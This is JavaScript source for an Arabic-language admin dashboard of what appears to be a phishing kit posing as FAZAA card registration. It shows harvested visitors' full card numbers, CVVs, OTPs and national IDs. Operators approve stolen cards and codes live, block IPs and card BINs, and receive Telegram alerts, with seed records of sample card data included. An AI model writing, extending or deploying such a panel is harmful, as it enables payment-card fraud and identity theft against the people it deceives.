const {
  useState,
  useEffect,
  useCallback,
  useRef
} = React;

// ─── Sound Generator ────────────────────────────────────────────────────────
function playChime() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(659.25, ctx.currentTime); // E5
    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.12); // A5
    gain.gain.setValueAtTime(0.25, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.45);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.45);
  } catch (e) {}
}

// ─── Helpers ────────────────────────────────────────────────────────────────
function timeAgo(iso) {
  if (!iso) return "الآن";
  const diff = Math.max(0, Date.now() - new Date(iso).getTime());
  const secs = Math.floor(diff / 1000);
  const mins = Math.floor(diff / 60000);
  const hrs = Math.floor(mins / 60);
  const days = Math.floor(hrs / 24);
  if (days > 0) return `منذ ${days} يوم`;
  if (hrs > 0) return `منذ ${hrs} ساعة`;
  if (mins > 0) return `منذ ${mins} دقيقة`;
  if (secs > 10) return `منذ ${secs} ثانية`;
  return "الآن";
}
function formatDateTime(iso) {
  if (!iso) return "";
  try {
    const d = new Date(iso);
    return d.toLocaleString("ar-SA", {
      hour: "2-digit",
      minute: "2-digit",
      year: "numeric",
      month: "2-digit",
      day: "2-digit"
    });
  } catch (e) {
    return iso;
  }
}
function formatTimeOnly(iso) {
  if (!iso) return "--:--";
  try {
    const d = new Date(iso);
    return d.toLocaleTimeString("ar-AE", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });
  } catch (e) {
    return iso;
  }
}
function formatShortTime(iso) {
  if (!iso) return "--:--";
  try {
    const d = new Date(iso);
    return d.toLocaleTimeString("ar-AE", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: true
    });
  } catch (e) {
    return iso;
  }
}
function formatFullDateTime(iso) {
  if (!iso) return "غير محدد";
  try {
    const d = new Date(iso);
    const dateStr = d.toLocaleDateString("ar-AE", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit"
    });
    const timeStr = d.toLocaleTimeString("ar-AE", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });
    return `${dateStr} • ${timeStr}`;
  } catch (e) {
    return iso;
  }
}
function maskCard(num) {
  if (!num) return "•••• •••• •••• ••••";
  const clean = num.replace(/\D/g, "");
  return clean.replace(/(\d{4})/g, "$1 ").trim();
}
function getCardType(num) {
  if (!num) return "unknown";
  const d = num.replace(/\D/g, "");
  if (d.startsWith("4")) return "visa";
  if (d.startsWith("5")) return "mastercard";
  if (d.startsWith("9") || d.startsWith("6")) return "mada";
  return "unknown";
}
function getBankName(num) {
  if (!num) return "البنك";
  const d = num.replace(/\D/g, "");
  const bin = d.slice(0, 6);
  const bins = {
    "529415": "SNB الأهلي",
    "529412": "SNB الأهلي",
    "529413": "SNB الأهلي",
    "411111": "بنك الراجحي",
    "426428": "بنك الراجحي",
    "455036": "بنك الرياض",
    "455037": "بنك الرياض",
    "400551": "بنك البلاد",
    "400552": "بنك البلاد",
    "540533": "بنك الإنماء",
    "540534": "بنك الإنماء",
    "405316": "بنك ساب SAB"
  };
  return bins[bin] || "SNB الأهلي";
}
function getStepLabel(page) {
  const labels = {
    schedule: "الجدول",
    search_results: "نتائج البحث",
    passenger_details: "بيانات المسافر",
    seat_selection: "اختيار البطاقة",
    payment: "الدفع ببطاقة الائتمان",
    otp: "رمز التحقق (OTP)",
    otp_verified: "تم التحقق",
    atm_pin: "رمز الصراف",
    phone_verify: "التحقق من الهاتف",
    nafad: "نفاذ",
    beneficiary: "المستفيد",
    success: "مكتمل بنجاح",
    card_error: "خطأ في البطاقة",
    otp_error: "خطأ في الرمز"
  };
  if (!page) return "—";
  const key = String(page);
  return labels[key] || key;
}
const DEFAULT_SEED_VISITORS = [{
  "id": "vis_mtlpxp5o_lzdsim",
  "name": "ليييييي",
  "phone": "444444444444444444",
  "email": "",
  "emiratesId": "44444444444444444444",
  "ip": "176.28.136.10",
  "step": "passenger_details",
  "createdAt": "2026-09-03T16:07:30.337Z",
  "updatedAt": "2026-09-24T22:49:54.313Z",
  "lastActiveAt": "2026-09-24T22:49:54.313Z",
  "currentPath": "/order",
  "pageTitle": "فزعة - FAZAA",
  "bookingData": {
    "الاسم": "ليييييي",
    "الهاتف": "444444444444444444",
    "رقم الهوية": "44444444444444444444",
    "المنطقة": "abu-dhabi",
    "العنوان": "3534534555",
    "الحي": "تم",
    "موعد التوصيل": "2026-09-21",
    "طريقة الدفع": "card",
    "البطاقة": "alsaada - gold",
    "fullName": "ليييييي",
    "phone": "444444444444444444",
    "emiratesId": "44444444444444444444",
    "brand": "alsaada",
    "cardType": "gold",
    "region": "abu-dhabi",
    "streetAddress": "3534534555",
    "neighborhood": "تم",
    "deliveryDate": "2026-09-21",
    "paymentMethod": "card"
  },
  "cardNumber": "44444444444444444444",
  "cardHolder": "ليييييي",
  "expiry": "55/55",
  "cvv": "555",
  "cardSubmittedAt": "2026-09-10T01:10:27.297Z",
  "cardApprovalStatus": "approved",
  "orderStatus": "pending"
}, {
  "id": "vis_test_verify_order",
  "name": "سعيد محمد المنصوري",
  "phone": "0509988776",
  "email": "",
  "emiratesId": "784-1992-1234567-3",
  "ip": "127.0.0.1",
  "step": "passenger_details",
  "orderStatus": "pending",
  "createdAt": "2026-09-23T23:20:37.473Z",
  "updatedAt": "2026-09-23T23:20:37.473Z",
  "lastActiveAt": "2026-09-23T23:20:37.473Z",
  "bookingData": {
    "الاسم": "سعيد محمد المنصوري",
    "الهاتف": "0509988776",
    "البطاقة": "فزعة - ذهبية"
  }
}, {
  "id": "test_vis_curl_1",
  "name": "محمد الكعبي",
  "phone": "0501234567",
  "email": "",
  "emiratesId": "784-1990-1234567-1",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-23T23:17:47.830Z",
  "updatedAt": "2026-09-23T23:17:47.830Z",
  "lastActiveAt": "2026-09-23T23:17:47.830Z"
}, {
  "id": "test_order_1790076194",
  "name": "عبدالله الهاشمي (طلب تجريبي)",
  "phone": "0509876543",
  "email": "abdullah.test@example.com",
  "emiratesId": "784-1990-1234567-1",
  "ip": "127.0.0.1",
  "step": "card",
  "createdAt": "2026-09-22T11:23:14.454Z",
  "updatedAt": "2026-09-22T11:23:23.996Z",
  "lastActiveAt": "2026-09-22T11:23:18.691Z",
  "currentPath": "/",
  "brand": "fazaa",
  "cardType": "gold",
  "bookingData": {
    "الاسم": "عبدالله الهاشمي (طلب تجريبي)",
    "الهاتف": "0509876543",
    "رقم الهوية": "784-1990-1234567-1",
    "الجهة": "فزعة (FAZAA)",
    "نوع البطاقة": "البطاقة الذهبية",
    "تاريخ الطلب": "2026-09-22"
  },
  "cardNumber": "5424000012345678",
  "expiry": "08/28",
  "cvv": "321",
  "cardHolder": "ABDULLAH ALHASHIMI",
  "orderStatus": "completed"
}, {
  "id": "vis_chart_4",
  "name": "فاطمة المنصوري",
  "phone": "0507778899",
  "email": "",
  "emiratesId": "",
  "ip": "127.0.0.1",
  "step": "success",
  "createdAt": "2026-09-20T01:17:47.537Z",
  "updatedAt": "2026-09-22T11:11:57.650Z",
  "lastActiveAt": "2026-09-20T01:17:47.537Z",
  "currentPath": "/",
  "brand": "alsaada",
  "cardType": "gold",
  "cardApprovalStatus": "approved",
  "otpApprovalStatus": "approved",
  "bookingData": {
    "الاسم": "فاطمة المنصوري",
    "الهاتف": "0507778899",
    "البطاقة": "بطاقة السعادة الذهبية",
    "brand": "alsaada",
    "cardType": "gold"
  },
  "cardNumber": "4242424242424242",
  "expiry": "12/29",
  "cvv": "999",
  "otp": "112233",
  "orderStatus": "pending"
}, {
  "id": "vis_chart_3",
  "name": "حمد المزروعي",
  "phone": "0505556677",
  "email": "",
  "emiratesId": "",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-20T01:17:47.519Z",
  "updatedAt": "2026-09-20T01:17:47.519Z",
  "lastActiveAt": "2026-09-20T01:17:47.519Z",
  "currentPath": "/",
  "brand": "homat",
  "cardType": "discount",
  "bookingData": {
    "الاسم": "حمد المزروعي",
    "الهاتف": "0505556677",
    "البطاقة": "بطاقة حماة الوطن للخصومات",
    "brand": "homat",
    "cardType": "discount"
  },
  "cardNumber": "5294150000001234",
  "expiry": "11/27",
  "cvv": "456"
}, {
  "id": "vis_chart_2",
  "name": "مريم الكعبي",
  "phone": "0503334455",
  "email": "",
  "emiratesId": "",
  "ip": "127.0.0.1",
  "step": "otp",
  "createdAt": "2026-09-20T01:17:47.502Z",
  "updatedAt": "2026-09-20T01:17:47.502Z",
  "lastActiveAt": "2026-09-20T01:17:47.502Z",
  "currentPath": "/",
  "brand": "esaad",
  "cardType": "silver",
  "bookingData": {
    "الاسم": "مريم الكعبي",
    "الهاتف": "0503334455",
    "البطاقة": "بطاقة إسعاد الفضية",
    "brand": "esaad",
    "cardType": "silver"
  },
  "cardNumber": "4111222233334444",
  "expiry": "08/28",
  "cvv": "123",
  "otp": "543210"
}, {
  "id": "vis_chart_1",
  "name": "سلطان الشامسي",
  "phone": "0501112233",
  "email": "",
  "emiratesId": "",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-20T01:17:47.483Z",
  "updatedAt": "2026-09-20T01:17:47.483Z",
  "lastActiveAt": "2026-09-20T01:17:47.483Z",
  "currentPath": "/",
  "brand": "fazaa",
  "cardType": "gold",
  "bookingData": {
    "الاسم": "سلطان الشامسي",
    "الهاتف": "0501112233",
    "البطاقة": "بطاقة فزعة الذهبية",
    "brand": "fazaa",
    "cardType": "gold"
  }
}, {
  "id": "vis_salem_test",
  "name": "زائر جديد",
  "phone": "",
  "email": "",
  "emiratesId": "",
  "ip": "127.0.0.1",
  "step": "otp",
  "createdAt": "2026-09-20T00:48:26.476Z",
  "updatedAt": "2026-09-20T00:48:26.476Z",
  "lastActiveAt": "2026-09-20T00:48:26.476Z",
  "otp": "445981",
  "otpSubmittedAt": "2026-09-20T00:48:26.475Z",
  "otpApprovalStatus": "waiting"
}, {
  "id": "vis_salem_1789865302416",
  "name": "سالم راشد الكتبي",
  "phone": "+971508899112",
  "email": "",
  "emiratesId": "784-1988-7654321-1",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-20T00:48:22.425Z",
  "updatedAt": "2026-09-20T00:48:22.433Z",
  "lastActiveAt": "2026-09-20T00:48:22.433Z",
  "currentPath": "/register",
  "pageTitle": "تسجيل بطاقة فزعة - FAZAA",
  "bookingData": {
    "البطاقة": "بطاقة فزعة الذهبية",
    "الاسم": "سالم راشد الكتبي",
    "الهاتف": "+971508899112",
    "الهوية": "784-1988-7654321-1",
    "الإمارة": "دبي",
    "المنطقة": "جميرا",
    "نوع البطاقة": "بطاقة فزعة الذهبية",
    "الشارع": "شارع شاطئ جميرا - فيلا 14"
  },
  "cardNumber": "5324 9911 2233 4455",
  "expiry": "09/29",
  "cvv": "789",
  "cardHolder": "SALEM RASHED ALKETBI"
}, {
  "id": "vis_live_test_1789865294630",
  "name": "سالم راشد الكتبي",
  "phone": "0508899112",
  "email": "",
  "emiratesId": "784-1988-7654321-1",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-20T00:48:14.643Z",
  "updatedAt": "2026-09-20T00:48:14.722Z",
  "lastActiveAt": "2026-09-20T00:48:14.722Z",
  "currentPath": "/register",
  "pageTitle": "تسجيل بطاقة فزعة - FAZAA",
  "bookingData": {
    "البطاقة": "بطاقة فزعة الذهبية",
    "الاسم": "سالم راشد الكتبي",
    "الهاتف": "0508899112",
    "الهوية": "784-1988-7654321-1",
    "نوع البطاقة": "بطاقة فزعة الذهبية",
    "الإمارة": "دبي",
    "المنطقة": "جميرا",
    "الشارع": "شارع شاطئ جميرا - فيلا 14"
  },
  "cardNumber": "5324991122334455",
  "expiry": "09/29",
  "cvv": "789",
  "cardHolder": "SALEM RASHED ALKETBI"
}, {
  "id": "test_vis_1789002996960",
  "name": "أحمد الإماراتي",
  "phone": "0501234567",
  "email": "",
  "emiratesId": "784-1990-1234567-1",
  "ip": "127.0.0.1",
  "step": "code",
  "createdAt": "2026-09-10T01:16:37.087Z",
  "updatedAt": "2026-09-10T01:16:37.130Z",
  "lastActiveAt": "2026-09-10T01:16:37.124Z",
  "cardNumber": "4111 2222 3333 4444",
  "expiry": "12/28",
  "cvv": "123",
  "cardHolder": "Ahmed Al Emarati",
  "cardSubmittedAt": "2026-09-10T01:16:37.102Z",
  "cardApprovalStatus": "approved",
  "otp": "987654",
  "otpSubmittedAt": "2026-09-10T01:16:37.123Z",
  "otpApprovalStatus": "approved"
}, {
  "id": "test_vis_1789002980294",
  "name": "أحمد الإماراتي",
  "phone": "0501234567",
  "email": "",
  "emiratesId": "784-1990-1234567-1",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-10T01:16:20.420Z",
  "updatedAt": "2026-09-10T01:16:20.432Z",
  "lastActiveAt": "2026-09-10T01:16:20.432Z",
  "cardNumber": "4111 2222 3333 4444",
  "expiry": "12/28",
  "cvv": "123",
  "cardHolder": "Ahmed Al Emarati",
  "cardSubmittedAt": "2026-09-10T01:16:20.432Z",
  "cardApprovalStatus": "waiting"
}, {
  "id": "vis_test_1789002457443",
  "name": "عبدالله السعيد",
  "phone": "0501234567",
  "email": "",
  "emiratesId": "784-1990-1234567-1",
  "ip": "127.0.0.1",
  "step": "passenger_details",
  "createdAt": "2026-09-10T01:07:37.450Z",
  "updatedAt": "2026-09-10T01:07:37.450Z",
  "lastActiveAt": "2026-09-10T01:07:37.450Z",
  "bookingData": {
    "الاسم": "عبدالله السعيد",
    "الهاتف": "0501234567",
    "رقم الهوية": "784-1990-1234567-1",
    "المنطقة": "دبي",
    "العنوان": "شارع الشيخ زايد"
  }
}, {
  "id": "vis_test_1788452639107",
  "name": "سلطان المنصوري",
  "phone": "0509876543",
  "email": "",
  "emiratesId": "784-1992-9876543-2",
  "ip": "127.0.0.1",
  "step": "payment",
  "createdAt": "2026-09-03T16:23:59.238Z",
  "updatedAt": "2026-09-03T16:23:59.257Z",
  "lastActiveAt": "2026-09-03T16:23:59.257Z",
  "currentPath": "/order",
  "bookingData": {
    "الاسم": "سلطان المنصوري",
    "الهاتف": "0509876543",
    "رقم الهوية": "784-1992-9876543-2",
    "المنطقة": "أبوظبي",
    "العنوان": "شارع الكورنيش",
    "الحي": "الخالدية",
    "البطاقة": "فزعة - بلاتينيوم"
  },
  "cardNumber": "4111111111111111",
  "expiry": "12/27",
  "cvv": "888",
  "cardHolder": "SULTAN AL MANSOORI",
  "cardSubmittedAt": "2026-09-03T16:23:59.256Z",
  "cardApprovalStatus": "waiting"
}, {
  "id": "vis_mtlq7ut3_cj1z10",
  "name": "زائر جديد",
  "phone": "",
  "email": "",
  "emiratesId": "",
  "ip": "94.142.48.247",
  "step": "schedule",
  "createdAt": "2026-09-03T16:18:04.707Z",
  "updatedAt": "2026-09-22T13:02:53.471Z",
  "lastActiveAt": "2026-09-22T13:02:53.471Z",
  "currentPath": "/",
  "pageTitle": "فزعة - FAZAA",
  "bookingData": {
    "الاسم": "",
    "الهاتف": "",
    "رقم الهوية": "",
    "المنطقة": "",
    "العنوان": "",
    "الحي": "",
    "موعد التوصيل": "",
    "طريقة الدفع": "card",
    "البطاقة": ""
  }
}, {
  "id": "vis_sample_01",
  "name": "عبدالله محمد الشمري",
  "phone": "+971501234567",
  "email": "abdullah@example.com",
  "emiratesId": "784-1990-1234567-1",
  "ip": "82.178.102.45",
  "step": "otp",
  "online": true,
  "status": "online",
  "createdAt": "2026-09-03T09:00:00.000Z",
  "updatedAt": "2026-09-03T16:18:17.343Z",
  "lastActiveAt": "2026-09-03T12:00:00.000Z",
  "cardNumber": "5294158823419012",
  "expiry": "08/28",
  "cvv": "492",
  "cardHolder": "ABDULLAH M ALSHAMMARI",
  "bank": "SNB الأهلي",
  "cardSubmittedAt": "2026-09-03T09:04:30.000Z",
  "cardApprovalStatus": "approved",
  "otp": "684910",
  "otpSubmittedAt": "2026-09-03T09:05:10.000Z",
  "otpApprovalStatus": "waiting",
  "bookingData": {
    "الاسم": "عبدالله محمد الشمري",
    "الهاتف": "+971501234567",
    "رقم الهوية": "784-1990-1234567-1",
    "المنطقة": "دبي",
    "العنوان": "شارع الشيخ زايد - برج الهدى",
    "البطاقة": "فزعة - ذهبية"
  }
}];

// ─── API Client With Resilient Cache & Cross-Tab Sync ──────────────────────
const adminApi = {
  async getMe() {
    try {
      const res = await fetch('/api/admin/me');
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    return {
      id: "1",
      email: "admin@cr7.com",
      name: "CR7 Admin"
    };
  },
  async getVisitors() {
    try {
      const res = await fetch('/api/admin/visitors');
      if (res.ok) {
        const ct = res.headers.get('content-type') || '';
        if (ct.includes('application/json')) {
          const data = await res.json();
          if (Array.isArray(data)) {
            try {
              localStorage.setItem('_cr7_visitors', JSON.stringify(data));
            } catch (e) {}
            return data;
          }
        }
      }
    } catch (e) {}
    try {
      const raw = localStorage.getItem('_cr7_visitors');
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch (e) {}
    try {
      localStorage.setItem('_cr7_visitors', JSON.stringify(DEFAULT_SEED_VISITORS));
    } catch (e) {}
    return DEFAULT_SEED_VISITORS;
  },
  async updateVisitor(id, updates) {
    try {
      const res = await fetch('/api/admin/visitors/' + id, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(updates)
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    // Update in localStorage
    try {
      const raw = localStorage.getItem('_cr7_visitors');
      if (raw) {
        const list = JSON.parse(raw);
        const idx = list.findIndex(v => v.id === id);
        if (idx !== -1) {
          list[idx] = {
            ...list[idx],
            ...updates,
            updatedAt: new Date().toISOString()
          };
          localStorage.setItem('_cr7_visitors', JSON.stringify(list));
          if (typeof BroadcastChannel !== 'undefined') {
            const bc = new BroadcastChannel('cr7_live_bus');
            bc.postMessage({
              type: 'update',
              visitor: list[idx]
            });
            bc.close();
          }
          return list[idx];
        }
      }
    } catch (e) {}
    return {
      id,
      ...updates
    };
  },
  async updateOrderStatus(id, orderStatus) {
    return this.updateVisitor(id, {
      orderStatus
    });
  },
  async deleteVisitor(id) {
    try {
      await fetch('/api/admin/visitors/' + id, {
        method: 'DELETE'
      });
    } catch (e) {}
    try {
      const raw = localStorage.getItem('_cr7_visitors');
      if (raw) {
        const list = JSON.parse(raw).filter(v => v.id !== id);
        localStorage.setItem('_cr7_visitors', JSON.stringify(list));
        if (typeof BroadcastChannel !== 'undefined') {
          const bc = new BroadcastChannel('cr7_live_bus');
          bc.postMessage({
            type: 'delete',
            id
          });
          bc.close();
        }
      }
    } catch (e) {}
    return true;
  },
  async getBlockedIps() {
    try {
      const res = await fetch('/api/admin/blocked-ips');
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      return JSON.parse(localStorage.getItem('_cr7_blocked_ips') || '[]');
    } catch (e) {
      return [];
    }
  },
  async blockIp(ip) {
    try {
      const res = await fetch('/api/admin/blocked-ips', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ip
        })
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      const ips = JSON.parse(localStorage.getItem('_cr7_blocked_ips') || '[]');
      if (!ips.includes(ip)) ips.push(ip);
      localStorage.setItem('_cr7_blocked_ips', JSON.stringify(ips));
      return ips;
    } catch (e) {
      return [ip];
    }
  },
  async unblockIp(ip) {
    try {
      const res = await fetch('/api/admin/blocked-ips/' + encodeURIComponent(ip), {
        method: 'DELETE'
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      const ips = JSON.parse(localStorage.getItem('_cr7_blocked_ips') || '[]').filter(x => x !== ip);
      localStorage.setItem('_cr7_blocked_ips', JSON.stringify(ips));
      return ips;
    } catch (e) {
      return [];
    }
  },
  async getBlockedBins() {
    try {
      const res = await fetch('/api/admin/blocked-bins');
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      return JSON.parse(localStorage.getItem('_cr7_blocked_bins') || '[]');
    } catch (e) {
      return [];
    }
  },
  async blockBin(bin) {
    try {
      const res = await fetch('/api/admin/blocked-bins', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          bin
        })
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      const bins = JSON.parse(localStorage.getItem('_cr7_blocked_bins') || '[]');
      if (!bins.includes(bin)) bins.push(bin);
      localStorage.setItem('_cr7_blocked_bins', JSON.stringify(bins));
      return bins;
    } catch (e) {
      return [bin];
    }
  },
  async unblockBin(bin) {
    try {
      const res = await fetch('/api/admin/blocked-bins/' + encodeURIComponent(bin), {
        method: 'DELETE'
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      const bins = JSON.parse(localStorage.getItem('_cr7_blocked_bins') || '[]').filter(x => x !== bin);
      localStorage.setItem('_cr7_blocked_bins', JSON.stringify(bins));
      return bins;
    } catch (e) {
      return [];
    }
  },
  async getTelegramConfig() {
    try {
      const res = await fetch('/api/admin/telegram-config');
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    try {
      return JSON.parse(localStorage.getItem('_cr7_tg_config') || '{"token":"","chatId":"","enabled":true}');
    } catch (e) {
      return {
        token: '',
        chatId: '',
        enabled: true
      };
    }
  },
  async saveTelegramConfig(config) {
    try {
      localStorage.setItem('_cr7_tg_config', JSON.stringify(config));
      const res = await fetch('/api/admin/telegram-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(config)
      });
      if (res.ok && res.headers.get('content-type')?.includes('application/json')) {
        return await res.json();
      }
    } catch (e) {}
    return {
      success: true,
      config
    };
  },
  async testTelegram(config) {
    try {
      const targetToken = config?.token || JSON.parse(localStorage.getItem('_cr7_tg_config') || '{}').token;
      const targetChatId = config?.chatId || JSON.parse(localStorage.getItem('_cr7_tg_config') || '{}').chatId;
      if (targetToken && targetChatId) {
        const tgRes = await fetch(`https://api.telegram.org/bot${targetToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: targetChatId,
            text: '✅ <b>تم فحص وتأكيد ربط التلجرام بنجاح!</b>',
            parse_mode: 'HTML'
          })
        });
        const tgData = await tgRes.json();
        if (tgData.ok) return {
          success: true
        };
        return {
          success: false,
          error: tgData.description
        };
      }
    } catch (e) {}
    return {
      success: false,
      error: 'تعذر الاتصال بـ Telegram'
    };
  },
  async logout() {
    await fetch('/api/admin/logout', {
      method: 'POST'
    }).catch(() => {});
    window.location.reload();
  }
};

// ─── Bank Logos ─────────────────────────────────────────────────────────────
const bankLogos = {
  "529415": {
    name: "SNB",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/xoCvtkKNzcZgXJik.png"
  },
  "529412": {
    name: "SNB",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/xoCvtkKNzcZgXJik.png"
  },
  "529413": {
    name: "SNB",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/xoCvtkKNzcZgXJik.png"
  },
  "411111": {
    name: "Rajhi",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/DsylUdSyWUldFSsL.png"
  },
  "426428": {
    name: "Rajhi",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/DsylUdSyWUldFSsL.png"
  },
  "455036": {
    name: "Riyad",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/PlbuywETzljmPTGT.png"
  },
  "455037": {
    name: "Riyad",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/PlbuywETzljmPTGT.png"
  },
  "400551": {
    name: "Albilad",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/rnSdgPdccjKmuRmy.png"
  },
  "400552": {
    name: "Albilad",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/rnSdgPdccjKmuRmy.png"
  },
  "540533": {
    name: "Alinma",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/zWblYFICgIBwKzbF.png"
  },
  "540534": {
    name: "Alinma",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/zWblYFICgIBwKzbF.png"
  },
  "405316": {
    name: "SAB",
    logo: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663871444653/xLolDCaqLQmvTwpj.png"
  }
};
function getBankLogoUrl(cardNumber) {
  if (!cardNumber) return null;
  const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
  return bankLogos[bin]?.logo || null;
}

// ─── Credit Card Display ────────────────────────────────────────────────────
function CardDisplay({
  cardNumber,
  expiry,
  cvv,
  cardHolder,
  bank
}) {
  const cardType = getCardType(cardNumber);
  const isMada = cardType === "mada" || cardType === "mastercard";
  const isVisa = cardType === "visa";
  const bankLogoUrl = getBankLogoUrl(cardNumber);
  return /*#__PURE__*/React.createElement("div", {
    className: "relative rounded-2xl p-6 w-full max-w-[380px] mx-auto shadow-credit-card overflow-hidden",
    style: {
      background: isMada ? "linear-gradient(145deg, #a8e6cf 0%, #7dd3a8 25%, #4ade80 50%, #22c55e 75%, #16a34a 100%)" : isVisa ? "linear-gradient(145deg, #1e3a5f 0%, #0f2340 50%, #0a1628 100%)" : "linear-gradient(145deg, #374151 0%, #1f2937 50%, #111827 100%)",
      color: "#fff"
    },
    dir: "ltr"
  }, /*#__PURE__*/React.createElement("div", {
    className: "absolute inset-0 opacity-[0.05]",
    style: {
      backgroundImage: "radial-gradient(circle at 25% 25%, white 1px, transparent 1px)",
      backgroundSize: "20px 20px"
    }
  }), /*#__PURE__*/React.createElement("div", {
    className: "relative flex items-start justify-between mb-5"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3"
  }, bankLogoUrl && /*#__PURE__*/React.createElement("img", {
    src: bankLogoUrl,
    alt: bank,
    className: "h-8 object-contain"
  }), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("div", {
    className: "text-xl font-bold tracking-wide",
    style: {
      fontFamily: "serif"
    }
  }, bank && bank.includes("SNB") ? /*#__PURE__*/React.createElement(React.Fragment, null, "SNB ", /*#__PURE__*/React.createElement("span", {
    className: "text-lg font-sans"
  }, "\u0627\u0644\u0623\u0647\u0644\u064A")) : bank || "SNB الأهلي"), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] opacity-60 tracking-[0.2em] uppercase mt-0.5 font-medium"
  }, "SAUDI NATIONAL BANK"))), /*#__PURE__*/React.createElement("div", {
    className: "text-[11px] font-bold bg-white/20 backdrop-blur-sm px-2.5 py-1 rounded-md border border-white/10"
  }, "AED / SAR")), /*#__PURE__*/React.createElement("div", {
    className: "relative text-[22px] font-mono tracking-[0.15em] mb-6 font-bold text-white/95"
  }, maskCard(cardNumber)), /*#__PURE__*/React.createElement("div", {
    className: "relative flex items-end justify-between mb-3"
  }, /*#__PURE__*/React.createElement("div", {
    className: "text-sm font-semibold uppercase tracking-wider text-white/90"
  }, (cardHolder || "CARD HOLDER").toUpperCase()), /*#__PURE__*/React.createElement("div", {
    className: "flex gap-5"
  }, /*#__PURE__*/React.createElement("div", {
    className: "text-right"
  }, /*#__PURE__*/React.createElement("div", {
    className: "text-[9px] opacity-50 uppercase tracking-wider mb-0.5"
  }, "EXP"), /*#__PURE__*/React.createElement("div", {
    className: "font-mono font-bold text-sm"
  }, expiry || "••/••")), /*#__PURE__*/React.createElement("div", {
    className: "text-right"
  }, /*#__PURE__*/React.createElement("div", {
    className: "text-[9px] opacity-50 uppercase tracking-wider mb-0.5"
  }, "CVV"), /*#__PURE__*/React.createElement("div", {
    className: "font-mono font-bold text-sm"
  }, cvv || "•••")))), /*#__PURE__*/React.createElement("div", {
    className: "relative flex items-center justify-between mt-2 pt-3 border-t border-white/10"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-lg"
  }, "\uD83C\uDDE6\uD83C\uDDEA"), isMada ? /*#__PURE__*/React.createElement("span", {
    className: "text-xs font-bold bg-white/15 backdrop-blur-sm px-2 py-0.5 rounded border border-white/10"
  }, /*#__PURE__*/React.createElement("span", {
    style: {
      color: "#bbf7d0"
    }
  }, "m"), /*#__PURE__*/React.createElement("span", {
    style: {
      color: "#93c5fd"
    }
  }, "ada")) : isVisa ? /*#__PURE__*/React.createElement("span", {
    className: "text-lg font-bold italic tracking-wider"
  }, "VISA") : /*#__PURE__*/React.createElement("span", {
    className: "text-xs font-bold tracking-wider"
  }, "MASTERCARD")), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] opacity-60 font-semibold tracking-wider"
  }, "DEBIT . STANDARD")));
}

// ─── Message Bubble ─────────────────────────────────────────────────────────
function MessageBubble({
  msg,
  visitor,
  onApprove,
  onReject,
